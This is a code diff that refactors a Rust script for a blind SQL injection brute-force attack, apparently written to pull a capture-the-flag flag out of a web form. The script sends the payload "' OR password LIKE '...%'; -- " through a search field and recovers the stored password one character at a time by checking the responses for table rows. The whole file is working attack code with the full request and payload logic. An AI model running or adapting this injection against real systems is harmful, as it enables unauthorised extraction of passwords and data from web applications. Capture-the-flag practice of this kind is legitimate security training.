@@ -16,39 +16,53 @@ fn main() -> Result<(), Box<dyn Error>> {
     println!("Starting SQL injection brute-force attack...");
 
     while !current_flag.ends_with(FLAG_SUFFIX) {
-        let mut found_next = false;
-        for &c in CHARSET {
-            let test_flag = format!("{}{}%", current_flag, c as char);
-            let payload = format!("' OR password LIKE '{}'; -- ", test_flag);
+        match find_next_char(&client, &current_flag) {
+            Some(c) => {
+                current_flag.push(c);
+                println!("[+] Found next character: {}", c);
 
-            println!("[*] Testing: {}", test_flag);
-
-            let res = client.post(URL)
-                .header("Content-Type", "application/x-www-form-urlencoded")
-                .body(format!("search={}", payload))
-                .send()?;
-
-            let body = res.text()?;
-
-            if body.contains("<td>") {
-                current_flag.push(c as char);
-                println!("[+] Found next character: {}", c as char);
-                found_next = true;
-
-                if c as char == '}' {
+                if c == '}' {
                     println!("[+] Found flag: {}", current_flag);
                     return Ok(());
                 }
+            }
+            None => {
+                println!("[-] No matching character found. Aborting.");
                 break;
             }
-        }
-
-        if !found_next {
-            println!("[-] No matching character found. Aborting.");
-            break;
         }
     }
 
     println!("[+] Found flag: {}", current_flag);
     Ok(())
+}
+
+fn find_next_char(client: &Client, current_flag: &str) -> Option<char> {
+    for &c in CHARSET {
+        let test_flag = format!("{}{}%", current_flag, c as char);
+        let payload = format!("' OR password LIKE '{}'; -- ", test_flag);
+
+        println!("[*] Testing: {}", test_flag);
+
+        let res = client.post(URL)
+            .header("Content-Type", "application/x-www-form-urlencoded")
+            .body(format!("search={}", payload))
+            .send();
+
+        match res {
+            Ok(response) => {
+                let body = response.text().unwrap_or_default();
+
+                if body.contains("<td>") {
+                    return Some(c as char);
+                }
+            }
+            Err(e) => {
+                eprintln!("Error sending request: {}", e);
+                return None;
+            }
+        }
+    }
+
+    None
 }
